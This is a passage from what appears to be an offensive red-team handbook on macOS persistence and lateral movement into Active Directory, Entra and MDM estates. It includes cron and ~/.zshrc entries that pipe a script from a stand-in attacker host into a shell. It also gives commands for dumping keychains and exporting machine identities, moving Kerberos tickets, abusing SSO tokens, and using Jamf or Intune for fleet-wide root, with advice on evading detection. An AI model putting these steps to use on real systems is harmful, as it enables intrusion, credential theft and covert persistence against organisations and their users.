- The plist is loadable but launchd refuses it: check ownership is `root:wheel` and the mode is not group-writable for system-domain items.

### Login items

The modern mechanism is `SMAppService`, which registers agents, daemons and login items declared inside an application bundle under `Contents/Library/LaunchAgents`, `Contents/Library/LaunchDaemons`, or `Contents/Library/LoginItems`. It replaced both the legacy login items list and, for most purposes, `SMJobBless`. It is fully BTM-integrated by design: registration is exactly the event BTM was built to report.

```bash
# Bundled helpers declared by installed applications: the modern login item surface.
find /Applications -maxdepth 5 -type d \
  \( -path '*/Contents/Library/LaunchAgents' -o -path '*/Contents/Library/LaunchDaemons' \
     -o -path '*/Contents/Library/LoginItems' \) 2>/dev/null

# The user-visible list, which is what BTM populates.
osascript -e 'tell application "System Events" to get the name of every login item'
```

The legacy `~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm` path that appears in transition-era write-ups does not exist on current macOS; the data model consolidated into the system BTM database. Treat that path as stale.

**Assessment.** Login items are the most user-visible persistence on the platform, because they are literally listed in a settings pane the user is told to check. Use them only when you want to look like legitimate software.

### Configuration profiles

**What it is.** A signed or unsigned `.mobileconfig` installed on the machine, delivering managed preferences, certificates, TCC grants, VPN configuration, or a Kerberos or SSO extension.

**Why it matters more than it looks.** A profile is not code execution, but it is the highest-leverage non-code persistence available. A PPPC payload grants your code identity Full Disk Access permanently. A certificate payload installs a trusted root, which is a durable interception capability. An SSO extension payload redirects authentication. Managed preferences override anything the user or a local administrator sets.

**Preconditions.** This is the catch. On current macOS, installing a configuration profile requires either user approval through System Settings (the user must open the file, then explicitly install it in the Privacy and Security pane) or delivery over MDM. Silent installation from the command line is not available to an attacker with root. That constraint is precisely why controlling MDM is the objective rather than crafting profiles locally.

```bash
profiles list
profiles show -type enrollment
system_profiler SPConfigurationProfileDataType
sudo profiles remove -identifier com.example.profile          # removal, where permitted
```

**Detection.** Profile installation and removal are reported by Endpoint Security (`ES_EVENT_TYPE_NOTIFY_PROFILE_ADD` and `_REMOVE`), appear in the unified log, and are visible to the MDM server as an inventory change. An unexpected profile on a managed Mac is one of the easiest things for an administrator to spot, because they know exactly what should be there.

### cron

**Still present and functional.** `/usr/sbin/cron` exists, `/usr/bin/crontab` is setuid root, and `com.vix.cron` is the launch daemon that manages it, started on demand rather than running permanently.

```bash
crontab -l                                    # your crontab
sudo crontab -l -u root                       # root's
sudo ls -la /usr/lib/cron/tabs/               # where they live
cat /etc/crontab 2>/dev/null

# Install. Read-modify-write, because crontab has no append.
(crontab -l 2>/dev/null; echo "*/30 * * * * /usr/bin/curl -fsSL http://$ATTACKER/s | /bin/sh") \
  | crontab -
```

**The macOS-specific catch is TCC.** Editing a crontab writes to `/usr/lib/cron/tabs/`, and on recent macOS a terminal application without Full Disk Access may be denied. If `crontab -e` or `crontab -` fails with `Operation not permitted` rather than `Permission denied`, that is TCC and not POSIX, and you need a granted process. <!-- VERIFY: exact conditions under which crontab requires FDA on macOS 26 -->

**Assessment.** cron's advantage is that it sits outside BTM: adding a crontab entry does not fire the launch item event and does not notify the user. Its disadvantage is that cron on a Mac is so unusual that its mere presence is anomalous. Most Macs have no crontabs at all, so `sudo ls /usr/lib/cron/tabs/` returning anything is itself a finding for a defender. Choose it when you want to avoid BTM and accept being obvious to anyone who looks in the right place.

### Shell startup files

No privilege required, no BTM event, no user notification. The cheapest persistence on the platform, and it only fires when the user opens a shell, which on a developer's machine is constantly and on an executive's machine may be never.

`zsh` has been the default shell since Catalina. The file precedence matters because it determines when your code runs:

| File | Runs for |
| --- | --- |
| `/etc/zshenv` | **Every** `zsh` invocation: interactive, non-interactive, login, script. Does not exist by default. Root required |
| `~/.zshenv` | Every `zsh` invocation for that user. User writable |
| `/etc/zprofile`, `~/.zprofile` | Login shells |
| `/etc/zshrc`, `~/.zshrc` | Interactive shells |
| `~/.zlogin`, `~/.zlogout` | Login shell start and exit |
| `/etc/profile`, `/etc/bashrc`, `~/.bash_profile`, `~/.bashrc` | `bash`, which is still present at version 3.2 |

`/etc/zshenv` is the strongest of these and does not exist on a stock install, which means creating it is both maximally effective and maximally conspicuous: it fires for every single `zsh` process on the machine including non-interactive ones invoked by scripts and by other software. `/etc/zprofile` and `/etc/zshrc` do exist and are `root:wheel 444`, so modifying them requires root and changes a file whose contents a configuration management system may well be checking.

```bash
# User level. No privilege needed.
cat >> ~/.zshrc <<'EOF'
[ -f ~/.cache/.p ] || { (/usr/bin/curl -fsSL http://$ATTACKER/s | /bin/sh &) ; }
EOF

# Check what already exists, including sourced files that are easier to hide in.
for f in /etc/zshenv /etc/zprofile /etc/zshrc ~/.zshenv ~/.zprofile ~/.zshrc \
         ~/.zlogin ~/.bash_profile ~/.bashrc ~/.profile; do
  [ -f "$f" ] && { echo "=== $f"; tail -20 "$f"; }
done
grep -rn 'source\|^\.' ~/.zshrc ~/.zprofile 2>/dev/null    # find files it already sources
```

Hiding in a file the shell already sources is considerably better than appending to `.zshrc` itself, because `.zshrc` is the first file anyone reads.

### Application bundle modification and dylib insertion

**What it is.** Making a legitimate application load your code, either by replacing a component or by planting a dylib in a hijackable search path.

**Why it is attractive.** It generates no launch item event, no BTM notification, and no new process with an unusual parent. Your code runs inside a signed application that the user launched deliberately, and it inherits that application's TCC grants and keychain ACL entries.

**Why it usually does not work, and what does.** Modifying a signed bundle invalidates the seal, so a hardened-runtime application fails to load, a quarantined application fails Gatekeeper assessment on next launch, and `tccd` refuses the recorded grant because the `csreq` no longer matches. The versions that do work are:

- Planting a dylib in an `LC_RPATH` directory or at a missing `LC_LOAD_WEAK_DYLIB` path for an application that carries `com.apple.security.cs.disable-library-validation`. Nothing in the bundle is modified, so the seal is intact.
- Targeting an application that is unsigned, ad-hoc signed, or has no hardened runtime (`flags=0x0(none)`).
- Re-signing the whole bundle ad-hoc after modification, which works but loses the original team identity and therefore any TCC grant recorded against it.
- Writing into a plugin, extension, or resource directory that lies outside the sealed resources, which varies per application.

```bash
# Confirm the seal is intact after you are done. If this fails, so will the app.
codesign --verify --deep --strict --verbose=4 /Applications/Target.app
spctl -a -vvv -t exec /Applications/Target.app
```

Note that on current macOS, writing into another application's bundle is gated by `kTCCServiceSystemPolicyAppBundles`, so this requires a granted process even as root.

**Detection.** Endpoint Security `NOTIFY_MMAP` sees the unsigned library being mapped. `NOTIFY_WRITE` and `NOTIFY_CREATE` see the file appear inside the bundle. Any file integrity monitoring over `/Applications` catches it. And a `codesign --verify` sweep, which is a standard macOS hunting technique, finds it immediately. This mechanism is quiet at runtime and noisy at installation.

### Authorisation plugins

**What it is.** A bundle in `/Library/Security/SecurityAgentPlugins` registered as a mechanism in an authorisation right, most usefully `system.login.console`, which is evaluated at every console login.

```bash
security authorizationdb read system.login.console
ls -la /Library/Security/SecurityAgentPlugins/
```

**Why it is interesting.** It runs as root, at login, before the user's session exists, in the authentication path itself. Historically it also ran with entitlements that allowed extraction of the plaintext password the user was in the middle of typing, which made it the premier macOS credential-capture persistence.

**Current status.** Apple moved plugin execution out of `authorizationhost` into a separate `authorizationhosthelper` XPC service with a much reduced entitlement set, which removed the password-extraction capability. The mechanism still loads and still runs code as root at login. It requires root to install, and `/Library/Security/SecurityAgentPlugins` is `root:wheel 755`. <!-- VERIFY: exact remaining entitlements and whether the mechanism still executes on macOS 26 -->

**Assessment.** Outside BTM, root-level, login-triggered, and rarely inspected. Genuinely good persistence, with the caveat that Jamf Connect and similar enterprise SSO products legitimately use this mechanism, so on a managed Mac there may already be plugins present, which is both cover for you and a reason the administrator knows what should be there.

### Other mechanisms

Enumerate and consider these; each is outside BTM and each is more obscure than a launch agent.

| Mechanism | Location | Privilege | Notes |
| --- | --- | --- | --- |
| Login and logout hooks | `defaults write com.apple.loginwindow LoginHook <path>`, stored in `/var/root/Library/Preferences/com.apple.loginwindow.plist` | root | Deprecated by Apple, one hook of each type system-wide, reportedly still functional <!-- VERIFY --> |
| `~/.ssh/authorized_keys` | Per user | User | Requires Remote Login enabled, which needs root. Also the cleanest re-entry mechanism on the platform |
| Directory service plugins | `/Library/DirectoryServices/PlugIns` | root | Load into `opendirectoryd` <!-- VERIFY: current path and whether still supported --> |
| Spotlight metadata importers | `/Library/Spotlight`, `~/Library/Spotlight` | User or root | Run in `mdworker` on file indexing. Objective-See reported an importer issue persisting into macOS 26 |
| QuickLook generators | `/Library/QuickLook`, `~/Library/QuickLook` | User or root | Run on preview generation. Modern replacement is a QuickLook app extension |
| Finder Sync and other app extensions | Inside an application bundle, registered via `pluginkit` | User | `pluginkit -mAvvv` enumerates every registered extension |
| Colour pickers, screen savers, audio units, input methods | `~/Library/ColorPickers`, `~/Library/Screen Savers`, `~/Library/Audio/Plug-Ins`, `~/Library/Input Methods` | User | Loaded into host processes. Old but obscure, and unmonitored |
| Saved application state | `~/Library/Saved Application State/<bundleid>.savedState/` | User | The "reopen windows on login" behaviour relaunches what was running. User-toggleable, not robust |
| System extensions | Registered via `OSSystemExtensionRequest` | root plus user or MDM approval | Requires approval, gives you Endpoint Security or Network Extension capability. Extremely powerful and extremely visible |

```bash
# Enumerate the plugin and extension surface in one pass.
pluginkit -mAvvv 2>/dev/null | head -60
for d in /Library/Spotlight ~/Library/Spotlight /Library/QuickLook ~/Library/QuickLook \
         /Library/ColorPickers ~/Library/ColorPickers ~/Library/Input\ Methods \
         /Library/Audio/Plug-Ins ~/Library/Audio/Plug-Ins \
         /Library/DirectoryServices/PlugIns /Library/Security/SecurityAgentPlugins \
         /Library/Internet\ Plug-Ins ~/Library/Internet\ Plug-Ins; do
  [ -d "$d" ] && { echo "=== $d"; ls -la "$d"; }
done
systemextensionsctl list
```

### Comparison

| Mechanism | Privilege to install | Survives reboot | Survives logout | BTM event | User notified | Detectability |
| --- | --- | --- | --- | --- | --- | --- |
| User launch agent | User | Yes, at next login | No | **Yes** | **Yes** | Very high |
| Global launch agent | root | Yes, at next login | No | **Yes** | **Yes** | Very high |
| Launch daemon | root | Yes, before login | Yes | **Yes** | **Yes** | Very high |
| Login item via `SMAppService` | User | Yes | No | **Yes** | **Yes** | Very high, it is in a settings pane |
| Configuration profile | User approval or MDM | Yes | Yes | No, but ESF profile events fire | Yes, unless via MDM | High. Administrators know their profile set |
| cron | User, plus possibly a TCC grant | Yes | Yes | **No** | **No** | Medium. Quiet, but any crontab on a Mac is anomalous |
| `~/.zshrc`, `~/.zshenv` | User | On next shell | On next shell | **No** | **No** | Medium. Trivially found if looked for, rarely looked for |
| `/etc/zshenv` | root | Every `zsh` process | Yes | **No** | **No** | Medium, and very high impact |
| Dylib hijack in a hijackable app | User or root for the path | On next app launch | Yes | **No** | **No** | Low at runtime, high at install |
| Bundle modification with re-sign | root plus a TCC grant | On next app launch | Yes | **No** | **No** | High. `codesign --verify` sweeps find it |
| Authorisation plugin | root | Yes, at every login | Yes | **No** | **No** | Low. Rarely inspected |
| Spotlight or QuickLook plugin | User or root | Yes | Yes | **No** | **No** | Low. Rarely inspected |
| `authorized_keys` plus Remote Login | User, plus root for the service | Yes | Yes | **No** | Service state is visible | Medium. The listening service is the tell |
| System extension | root plus approval | Yes | Yes | No | **Yes**, approval required | Very high |
| MDM policy or Jamf policy | MDM console access | Yes | Yes | No | No | Low on the endpoint. It looks exactly like management |

The bottom row is the point of Enterprise Integration and Lateral Movement, which follows. Persistence delivered through the management platform is indistinguishable from legitimate administration on the endpoint, survives reimaging, and applies to the whole fleet.

## Enterprise Integration and Lateral Movement

This is the part most macOS treatments skip and the part that matters most in an Active Directory or Entra estate. A Mac is not an island. It is an enrolled, certificate-bearing, Kerberos-ticket-holding member of the same identity fabric as the Windows fleet, and it is usually managed by a platform with root on every machine.

### How Macs actually join the estate

Four models, in rough order of decreasing prevalence in modern deployments. Determine which one you are looking at before anything else, because the credentials, the tickets, and the lateral paths are completely different.

| Model | Indicators | What a compromised Mac yields |
| --- | --- | --- |
| **Cloud-first, MDM plus Platform SSO** | `profiles status` shows an MDM server; `dscl /Search -read / SearchPath` includes `/Platform SSO`; `klist` shows `KERBEROS.MICROSOFTONLINE.COM` | Entra tokens, device registration identity, Conditional Access satisfaction, and a Kerberos realm bridging to on-premises if cloud Kerberos trust is configured |
| **MDM plus Kerberos SSO extension** | An `com.apple.AppSSOKerberos`-type extension profile, `app-sso -l` lists realms, tickets for the on-premises realm | On-premises AD tickets and the user's AD password, potentially cached in the keychain |
| **AD-bound via Apple's plugin** | `dsconfigad -show` returns a domain; `SearchPath` includes `/Active Directory/DOMAIN`; mobile accounts exist | An AD machine account credential, cached AD user hashes, and direct Kerberos participation |
| **Unmanaged or lightly managed** | `profiles status` reports no MDM; local accounts only | Whatever is on the box. Often more, because there is no monitoring |

```bash
# The four-command determination.
profiles status -type enrollment
dscl /Search -read / SearchPath
dsconfigad -show
app-sso -l && app-sso platform -s
klist -l
```

### Active Directory binding, and why it is mostly gone

Apple's Active Directory plugin still ships and `dsconfigad` still works, but Apple has invested nothing in it for years and its own deployment guidance steers administrators to Platform SSO or the Kerberos SSO extension. You will still meet bound Macs in long-lived estates, and when you do they are excellent targets.

```bash
dsconfigad -show
# Domain, forest, computer OU, preferred DC, namespace mode, packet signing,
# mobile account creation, and the admin groups mapped to local admin.
```

The interesting outputs are the **Allowed admin groups** mapping, which tells you which AD groups get local administrator on every bound Mac (frequently `Domain Admins` and a helpdesk group, which is a fleet-wide lateral path), and whether **mobile accounts** are created, which means AD users have cached local accounts with locally stored credential material.

The machine account credential is the prize, because it is a domain credential:

```bash
sudo ls -la /Library/Preferences/OpenDirectory/Configurations/Active\ Directory/
sudo ls -la /Library/Preferences/OpenDirectory/DynamicData/
sudo security dump-keychain -d /Library/Keychains/System.keychain 2>/dev/null | \
  grep -i -B5 -A10 'active directory'
```

The AD plugin keeps the computer account password in the System keychain, which root can read via `/var/db/SystemKey` with no user password required. With it you can request tickets as the machine account and feed the delegation and RBCD material in the Kerberos Abuse section. Confirm the exact item naming on the target build rather than trusting a published grep pattern. <!-- VERIFY: System keychain item attributes for the AD computer account on macOS 26 -->

```bash
# Enumerate the directory from the Mac. dscl talks to AD through opendirectoryd,
# so this is authenticated LDAP without needing to bring your own tooling.
dscl "/Active Directory/$NETBIOS/All Domains" -list /Users
dscl "/Active Directory/$NETBIOS/All Domains" -read /Users/$USER
dscl "/Active Directory/$NETBIOS/All Domains" -list /Groups
dscl "/Active Directory/$NETBIOS/All Domains" -read /Groups/"Domain Admins"
id "$NETBIOS\\$USER"
```

That is a genuinely useful capability: a bound Mac gives you authenticated directory enumeration through the OS, using the machine's own credentials, with no LDAP tooling to bring in and no unusual network traffic. It is quieter than running `ldeep` or `bloodyAD` from the same host. For anything beyond basic enumeration, get a ticket into a file cache and use the tooling from the Active Directory: Enumeration section properly.

### Kerberos on macOS

Covered in detail under Credential Extraction on macOS above; the essentials for lateral movement:

- Heimdal, not MIT. The `kinit`, `klist`, `kdestroy`, `kswitch` and `kgetcred` commands exist with Heimdal syntax.
- The default cache is `API:` and is held by the `GSSCred` daemon, not written to disk. Access control is by audit session by default.
- Force a portable file cache with `KRB5CCNAME=FILE:/path` or `kinit -c FILE:/path`, and the result is standard ccache format, consumable by Impacket and anything else honouring `KRB5CCNAME`.
- Kerberos needs FQDNs and working forward and reverse DNS. A corporate Mac on the internal network normally has both, which makes it a convenient jump-off point.

```bash
# Acquire a TGT as a user whose password you have, into a portable cache.
KRB5CCNAME=FILE:/tmp/u.ccache kinit "$USER@${DOMAIN:u}"
klist -c FILE:/tmp/u.ccache -v

# Request a service ticket, which pre-populates the cache for a specific target.
KRB5CCNAME=FILE:/tmp/u.ccache kgetcred "cifs/$TARGET@${DOMAIN:u}"
KRB5CCNAME=FILE:/tmp/u.ccache kgetcred "host/$TARGET@${DOMAIN:u}"

# Use it. smbutil and mount_smbfs both honour Kerberos.
KRB5CCNAME=FILE:/tmp/u.ccache smbutil view "//$TARGET"
KRB5CCNAME=FILE:/tmp/u.ccache mount_smbfs -o nobrowse "//$TARGET/share" /Volumes/x
```

```bash
# SMB from a Mac generally. macOS ships a competent SMB client.
smbutil statshares -a                          # existing shares and their security
smbutil view -A "//$USER@$TARGET"              # enumerate shares, prompts for password
mkdir /Volumes/x && mount_smbfs "//$NETBIOS;$USER@$TARGET/C\$" /Volumes/x
mount | grep smbfs
smbutil lookup "$TARGET"
```

Note that `smbutil` and `mount_smbfs` store credentials in the login keychain as internet password items with the `smb` protocol when the user asks to remember them, which is why enumerating keychain internet passwords is a map of the file server estate. Conversely, mounting a share yourself writes such an item, which is an artefact.

### SSO extensions and Platform SSO

This is the modern reality on a Microsoft-centric estate and it is the highest-value macOS-specific identity material available.

**The Kerberos SSO extension** is Apple's built-in extension type for on-premises AD. It proactively acquires a TGT when the network state changes, performs LDAP-ping site discovery, and manages password expiry notification. It optionally stores the user's password in the keychain so it can renew tickets unattended, which is exactly the credential you want.

```bash
app-sso -l                                     # configured realms
app-sso -i "${DOMAIN:u}"                       # realm information
app-sso -i "${DOMAIN:u}" -v -j                 # verbose, JSON, includes the site cache
app-sso -t "${DOMAIN:u}"                       # shared Kerberos settings
```

**Platform SSO** (macOS 13 and later, meaningfully usable from macOS 14) is the bigger deal. It integrates an identity provider into the login window itself, so the local account authenticates against the IdP, and it registers a device identity with that IdP. On a Microsoft estate the extension is the Company Portal's SSO extension.

The state is fully readable without privilege:

```bash
app-sso platform -s
```

```text
Device Configuration:
{
  "extensionIdentifier" : "com.microsoft.CompanyPortalMac.ssoextension",
  "loginType" : "POLoginTypeUserSecureEnclaveKey (2)",
  "registrationCompleted" : true,
  "authorizationEnabled" : true,
  "createUsersEnabled" : true,
  "createUserLoginTypes" : [ 1, 3 ],
  "loginFrequency" : 64800,
  "sharedDeviceKeys" : true,
  "encryptionAlgorithm" : "ECDHE-A256GCM",
  "deviceSigningCertificate" : "MIIDNzCCAh...",
  "_deviceSigningKeyData" : "APyjjh9EJVgc9+gQwty3nPmlogUnCQ46OVyZAGH8Xv4=",
  "_deviceEncryptionKeyData" : "9l/y2+IM43wHtBQoqIsqIpJrDGWYvlmtTfsH/JS+VRk=",
  "_accessTokenTerminalIdentityKeySEP" : false,
  "nonPlatformSSOAccounts" : [ ... ],
  "fileVaultPolicy" : "None (0)",
  "authGracePeriodStart" : "2026-05-27T19:14:33Z"
}
```

Read that output carefully, because it is a complete description of the machine's cloud identity posture from an unprivileged shell.

- `deviceSigningCertificate` is the device registration certificate: the macOS equivalent of the Windows Workplace Join certificate. Decode it and you get the tenant identifier and the device object identifier. In the real example above the certificate is issued by `MS-Organization-Access` with an OU carrying the tenant GUID and a CN carrying the device GUID, exactly as on Windows.
- `loginType` tells you where the key lives. `POLoginTypeUserSecureEnclaveKey` means the credential is a Secure Enclave key, which is **not extractable**. A password-sync configuration means the user's IdP password is being synchronised to the local account, which is a very different and much better proposition for you.
- The key data fields are identifiers and public key material, not private keys, when the key is Secure Enclave backed. <!-- VERIFY: exact semantics of _deviceSigningKeyData -->
- `createUsersEnabled` with `createUserLoginTypes` means the IdP can cause local accounts to be created at the login window, and on macOS 14 and later the account's administrator status can be driven from IdP group membership and re-evaluated at every authentication. That is a fleet-wide privilege assignment controlled from the identity provider.

```bash
# Decode the device certificate to read the tenant and device identifiers.
app-sso platform -s | python3 -c "
import sys,json,base64
d=json.loads(sys.stdin.read().split('Device Configuration:',1)[1].split('\n\n')[0].strip())
open('/tmp/dev.der','wb').write(base64.b64decode(d['deviceSigningCertificate']+'=='))
" 2>/dev/null
openssl x509 -inform der -in /tmp/dev.der -noout -subject -issuer -dates -ext 1.2.840.113556.1.5.284.2
```

<!-- VERIFY: the JSON extraction above depends on app-sso output formatting; parse defensively -->

**What a compromised Mac with Platform SSO yields for the tenant.** The Microsoft Enterprise SSO plug-in is the macOS analogue of the Windows PRT broker. Microsoft's own documentation states that when the device is known to Entra ID, the plug-in passes the device certificate to satisfy device-based Conditional Access checks. Practically:

- Any application participating in SSO gets tokens silently, and that includes browsers: Safari natively, Edge when signed in, Chrome via the Microsoft Single Sign-On extension or a recent Chrome version, Firefox via the `MicrosoftEntraSSO` policy.
- Because device-based Conditional Access is satisfied by the plug-in, a compromised Mac is a *compliant device* from the tenant's point of view. That is the single most valuable thing here: policies that would block your access from an unmanaged host do not block it from this one.
- Token caches live in the keychain and in the Microsoft group containers. Enumerate both.

```bash
ls -d ~/Library/Group\ Containers/UBF8T346G9.* 2>/dev/null
# UBF8T346G9.com.microsoft.entrabroker
# UBF8T346G9.com.microsoft.identity.ssoextensiongroup
# UBF8T346G9.com.microsoft.oneauth
# UBF8T346G9.Office
security dump-keychain 2>/dev/null | grep -iE 'adalcache|oneauth|msal|entra|workplacejoin'
find ~/Library/Group\ Containers/UBF8T346G9.com.microsoft.oneauth -type f 2>/dev/null | head
```

<!-- VERIFY: exact MSAL/OneAuth cache file layout inside the group containers -->

**The key-extractability question is the whole story.** Microsoft moved the device registration key from the keychain to the Secure Enclave, with Secure Enclave as the default for new registrations from around August 2025. Before that migration, or on hardware without it, the key is a keychain item and is therefore portable: steal it and you can impersonate the device from anywhere. After the migration it is hardware-bound and you can only use it while you are on the box. This is precisely the Windows TPM-bound PRT story replayed, and the operational consequence is the same: prefer techniques that operate *from* the compromised host over techniques that exfiltrate a key. <!-- VERIFY: exact Secure Enclave default rollout date -->

Cross-reference the Cloud and Modern Identity section for what to do with Entra tokens, device compliance, Conditional Access evaluation and Primary Refresh Token abuse once you have them. The macOS-specific contribution is the acquisition route and the compliant-device property, not the token abuse itself.

### Device management as the highest-value target

State it plainly, because it is the most important sentence in this whole section: **a device management platform can execute code as root on every enrolled Mac, and that is a documented, supported, intended feature, not a vulnerability.** Compromising the management console is therefore equivalent to root on the entire macOS fleet, in a channel that is already whitelisted, already expected, and already logged as normal administrative activity.

The mechanism differs slightly by product but the outcome does not.

**Apple's MDM protocol** is the common substrate. It is command-and-declaration based over HTTPS with APNs wake-ups, and it is agentless: `/usr/libexec/mdmclient` handles it. The relevant commands are `InstallApplication` and `InstallEnterpriseApplication`, which push a package that `installd` unpacks and whose `preinstall` and `postinstall` scripts run as root. Package signing and notarisation are not required for internal-use enterprise packages, so this is a legitimate unsigned-root-code-execution channel. `ScheduleOSUpdate`, remote lock and wipe, profile installation, and certificate provisioning round it out.

What bare MDM cannot do is also worth knowing, because it bounds your visibility if you compromise a pure-MDM tenant: there is no "list running processes" command, no arbitrary remote shell, and no filesystem browsing. The inventory commands (`DeviceInformation`, `InstalledApplicationList`, `ProfileList`, `CertificateList`, `SecurityInfo`) are snapshots pulled at check-in, not a live feed.

**Jamf Pro** goes far beyond that, and is the richest target. The `jamf` binary runs from a root LaunchDaemon and executes policies. A policy can carry a script, and that script runs as root. Extension Attributes are administrator-authored scripts that run as root at inventory collection and report their output back to the console, which means they are both an arbitrary-code channel and an arbitrary-data-exfiltration channel. Scoping a policy to "All Computers" with an ongoing trigger gives you root on the entire fleet at the next check-in.

```bash
# On the endpoint: identify Jamf and read its configuration.
ls -l /usr/local/jamf/bin/jamf
defaults read /Library/Preferences/com.jamfsoftware.jamf.plist
defaults read /Library/Preferences/com.jamfsoftware.jamf.plist jamf_url
ls -la /Library/Application\ Support/JAMF/
ls -l /Library/LaunchDaemons/com.jamfsoftware.* /Library/LaunchDaemons/com.jamf.*

# The local binary is itself the API surface.
sudo jamf help
sudo jamf policy -verbose            # force a check-in and see every policy fire
sudo jamf recon -verbose             # force inventory, showing what is collected
sudo jamf checkJSSConnection
sudo jamf listUsers
```

`sudo jamf policy -verbose` is the highest-yield single command on a Jamf-managed Mac. It forces a check-in and prints, in order, every policy the machine is scoped to, every script that runs, and every package that installs, which is a complete description of what the management platform does to this machine and therefore of what you could do with it.

**Intune** rides the native MDM protocol plus the Intune agent. On a real Intune-managed Mac the artefacts are `/Library/Intune/Microsoft Intune Agent.app`, `/Library/Application Support/Microsoft/Intune/`, and the `com.microsoft.intuneMDMAgent.daemon` LaunchDaemon. Intune's shell script and custom attribute features explicitly offer a "run script as signed-in user" toggle, and setting it to no means the script runs as root. So Intune-tenant compromise is also fleet root, subject to check-in latency and to having script-deployment privilege rather than read-only access in the console.

```bash
ls -la /Library/Intune/ "/Library/Application Support/Microsoft/Intune/"
ls -la "/Library/Application Support/Microsoft/Intune/SideCar" 2>/dev/null
ls -l /Library/LaunchDaemons/com.microsoft.intuneMDMAgent.daemon.plist
ls -l /Library/LaunchAgents/com.microsoft.intuneMDMAgent.plist
log show --last 1h --predicate 'process CONTAINS "IntuneMdmDaemon"' --style compact 2>/dev/null | head
```

<!-- VERIFY: Intune agent process names and log predicate on macOS 26 -->

**Enumerating the management platform from the endpoint, and then attacking it.** The endpoint tells you the server URL, the enrolment identity, and often more. From there the attack is a web application and API attack against the console, covered by the same reasoning as any other enterprise service: credential reuse from the estate, SSO integration, API tokens, and the vendor's own vulnerability history.

```bash
# The server, from the enrolment profile and from the MDM payload.
profiles status -type enrollment | grep 'MDM server'
system_profiler SPConfigurationProfileDataType | grep -iE 'ServerURL|CheckInURL|jamf|manage'

# The device's own MDM identity certificate, which authenticates it to the server.
security find-certificate -a -p /Library/Keychains/System.keychain | \
  openssl storeutl -noout -text /dev/stdin 2>/dev/null | grep -iE 'subject|issuer' | head -40
security find-identity -v /Library/Keychains/System.keychain
```

**The bootstrap token** is the other thing to understand about a managed Mac. It is a credential generated when a secure-token-holding user first logs in, escrowed to the MDM server, and used to grant secure tokens to new users, authorise software updates without user interaction, silently authorise Erase All Content and Settings, and create local users on first Platform SSO login. It is what lets MDM do FileVault-adjacent things unattended.

```bash
sudo profiles status -type bootstraptoken
sudo profiles validate -type bootstraptoken
```

Consequence: an MDM server holding escrowed bootstrap tokens holds the ability to create secure-token-enabled local accounts on every enrolled Mac, which means fleet-wide interactive access that survives FileVault. It typically also holds escrowed FileVault personal recovery keys, which the marker file `/var/db/ConfigurationProfiles/Settings/com.apple.security.FDERecoveryKeyEscrow.plist` on the endpoint tells you is happening. An MDM console with recovery key escrow is a fleet-wide full disk decryption capability.

**Supervision is the dividing line for what MDM can do silently.** A DEP/ADE-enrolled, supervised Mac accepts silent PPPC grants, cannot remove the MDM profile, and exposes the full command set. A user-approved, unsupervised enrolment has a smaller silent surface. `profiles status -type enrollment` tells you which you have, and it materially changes what compromising the console buys you.

### Certificate-based network authentication and the machine identity

Corporate Macs commonly carry a machine identity certificate provisioned by SCEP or ACME through a configuration profile, used for 802.1X wired and wireless authentication, VPN, and device attestation. Whether that identity is stealable is a single-field question.

```bash
# The provisioning payload, which states the policy explicitly.
system_profiler SPConfigurationProfileDataType | grep -A25 -iE 'com.apple.security.(scep|acme)'

# The resulting identities in the System keychain.
sudo security find-identity -v /Library/Keychains/System.keychain
sudo security find-certificate -a -p /Library/Keychains/System.keychain > /tmp/machine-certs.pem
openssl crl2pkcs7 -nocrl -certfile /tmp/machine-certs.pem | \
  openssl pkcs7 -print_certs -noout

# Attempt export. This is where the policy bites.
sudo security export -k /Library/Keychains/System.keychain -t identities \
  -f pkcs12 -P "$PASS" -o /tmp/machine.p12
```

The fields that decide the outcome, read from the real ACME payload shown earlier:

| Field | Meaning | Consequence |
| --- | --- | --- |
| `KeyIsExtractable = 0` | The keychain export flag is cleared | `security export` refuses. A software policy control, not a hardware one |
| `KeyIsExtractable = 1` | Exportable | Root exports the identity and impersonates the device from anywhere |
| `HardwareBound = 0` | Ordinary software key in the keychain | Theft is a software problem, and software problems are solvable |
| `HardwareBound = 1` | Key generated inside the Secure Enclave | **Not extractable by any means.** Root, kernel compromise, nothing gets it out |
| `Attest = 1` | Managed Device Attestation: the CA cryptographically verified the device | The certificate is bound to genuine, managed hardware |

**Managed Device Attestation** (Apple silicon, macOS 14 and later) is the mechanism that actually closes this. During ACME enrolment the OS generates the private key inside the Secure Enclave and the issuing CA validates, cryptographically, that the request came from a genuine managed device with the asserted properties. Apple's own description is that the Secure Enclave has very strong protections against key extraction even when the application processor is compromised. Keys are destroyed on erase.

The operational rule is therefore: **on a hardware-bound, attested identity you can use the device credential while you are on the box and you can never take it with you.** That means using it for 802.1X or VPN authentication proxied through the host, not exfiltrating a `.p12`. On a non-attested, non-hardware-bound identity, which is what you get on Intel Macs and on any deployment that has not turned MDA on, the identity is an ordinary keychain item and root takes it. The real example earlier in this section reads `Attest = 0` and `HardwareBound = 0`, which is the common case and the one worth checking for on every managed Mac.

```bash
# 802.1X configuration, to know what the identity is used for.
system_profiler SPConfigurationProfileDataType | grep -A20 -i 'com.apple.firstactiveethernet\|EAPClientConfiguration'
networksetup -listallnetworkservices
sudo networksetup -getcurrentlocation
scutil --nwi                                   # network information, including interfaces
```

### Routes from a compromised Mac into the wider estate

Ordered by how often they work.

**1. Cloud identity, through the SSO plug-in.** Covered above. The compromised Mac is a compliant device, so tokens acquired from it satisfy Conditional Access. This is usually the fastest path to the highest-value assets, because the estate's data has moved to the tenant. Cross-reference the Cloud and Modern Identity section.

**2. Credential reuse into the Windows estate.** The macOS user is usually the same directory principal as a Windows user. A cracked `ShadowHashData` hash, a keychain-stored AD password from the Kerberos SSO extension, or a browser-stored credential is directly usable against the Windows fleet. This is where the Kerberos Abuse and Lateral Movement sections take over.

**3. Kerberos tickets.** Get a TGT into a file cache and use it against SMB, LDAP, MSSQL and everything else. The Mac is a legitimate Kerberos client so this generates entirely normal-looking traffic.

**4. Mounted and remembered network shares.** The share list is a map of the file server estate and the keychain holds the credentials used to reach it.

```bash
mount | grep -E 'smbfs|nfs|afpfs'
smbutil statshares -a
security dump-keychain 2>/dev/null | grep -i -B2 -A6 'smb\|afp\|network password'
defaults read com.apple.sidebarlists 2>/dev/null | grep -i -A3 'server'
ls -la /Volumes/
```

**5. SSH keys and agent forwarding.** Developer Macs are the jump host for the production estate. Read `~/.ssh/config` for the topology as much as for the credentials: `Host` blocks, `ProxyJump` directives and `IdentityFile` paths draw you a map.

